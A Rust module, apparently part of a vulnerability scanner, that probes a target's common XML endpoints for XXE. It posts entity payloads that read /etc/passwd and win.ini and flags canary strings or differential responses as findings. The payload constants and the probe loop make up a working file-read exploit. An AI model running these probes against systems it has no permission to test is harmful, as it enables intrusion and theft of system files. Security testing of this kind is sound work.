//! XXE Engine — XML endpoint discovery with differential entity-expansion probes.
//! MITRE: T1190 (Exploit Public-Facing Application).

use crate::engine_probes::{empty_ok, finding_with_probe_depth, http_client, normalize_url};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};
use std::time::Duration;

const XXE_PROBE_DEPTH: &str = "xxe_xml_surface";

fn xxe_finding(title: &str, severity: &str, description: &str, target: &str, extra: Value) -> Value {
    let mut f = finding_with_probe_depth(
        "xxe",
        title,
        severity,
        "T1190",
        description,
        target,
        XXE_PROBE_DEPTH,
    );
    if let Some(obj) = f.as_object_mut() {
        if let Some(map) = extra.as_object() {
            for (k, v) in map {
                obj.insert(k.clone(), v.clone());
            }
        }
    }
    f
}

async fn http_post_xml(client: &reqwest::Client, url: &str, body: &str) -> Option<crate::engine_probes::HttpProbe> {
    let resp = client
        .post(url)
        .header("Content-Type", "application/xml")
        .body(body.to_string())
        .timeout(Duration::from_secs(8))
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
        .collect();
    let body_text = resp.text().await.unwrap_or_default();
    let body_text = if body_text.len() > 65_536 {
        body_text[..65_536].to_string()
    } else {
        body_text
    };
    Some(crate::engine_probes::HttpProbe {
        status,
        headers,
        body: body_text,
        final_url,
    })
}

const XXE_PASSWD: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
const XXE_WININI: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>"#;

const PASSWD_CANARIES: &[&str] = &["root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh"];
const WININI_CANARIES: &[&str] = &["[fonts]", "[extensions]", "for 16-bit app support"];

pub async fn run_xxe_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    let xml_paths = [
        "/",
        "/api",
        "/api/v1",
        "/xml",
        "/upload",
        "/import",
        "/soap",
        "/service",
        "/ws",
        "/api/import",
        "/api/xml",
        "/api/upload",
    ];

    for path in &xml_paths {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        let ping = http_post_xml(&client, &url, "<ping/>").await;
        let Some(ping) = ping else { continue };
        if ping.status == 415 || ping.status == 404 {
            continue;
        }

        if let Some(xxe) = http_post_xml(&client, &url, XXE_PASSWD).await {
            if PASSWD_CANARIES.iter().any(|c| xxe.body.contains(c))
                && !xxe.body.contains("file:///etc/passwd")
            {
                findings.push(xxe_finding(
                    "XXE: /etc/passwd content in response",
                    "critical",
                    &format!(
                        "POST {} with external entity returned passwd canary (HTTP {}). Arbitrary file read confirmed.",
                        xxe.final_url, xxe.status
                    ),
                    target,
                    json!({ "path": path, "canary": "passwd" }),
                ));
                break;
            }
        }

        if let Some(xxe) = http_post_xml(&client, &url, XXE_WININI).await {
            if WININI_CANARIES.iter().any(|c| xxe.body.contains(c))
                && !xxe.body.contains("win.ini")
            {
                findings.push(xxe_finding(
                    "XXE: Windows win.ini content in response",
                    "critical",
                    &format!(
                        "POST {} with external entity returned win.ini canary (HTTP {}).",
                        xxe.final_url, xxe.status
                    ),
                    target,
                    json!({ "path": path, "canary": "win.ini" }),
                ));
                break;
            }
        }

        if let Some(xxe) = http_post_xml(&client, &url, XXE_PASSWD).await {
            let delta = (xxe.body.len() as i64 - ping.body.len() as i64).abs();
            if delta > 48
                && xxe.status != ping.status
                && !xxe.body.contains("<!ENTITY")
                && !xxe.body.contains("&xxe;")
            {
                findings.push(xxe_finding(
                    "XXE: differential response to entity expansion",
                    "high",
                    &format!(
                        "XML endpoint {} changed response (ping HTTP {} / {} B → XXE HTTP {} / {} B) without echoing the payload — blind XXE candidate.",
                        url, ping.status, ping.body.len(), xxe.status, xxe.body.len()
                    ),
                    target,
                    json!({ "path": path }),
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("xxe", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("xxe: {} live finding(s)", n))
    }
}

pub async fn run_xxe(target: &str) {
    print_result(run_xxe_result(target).await);
}
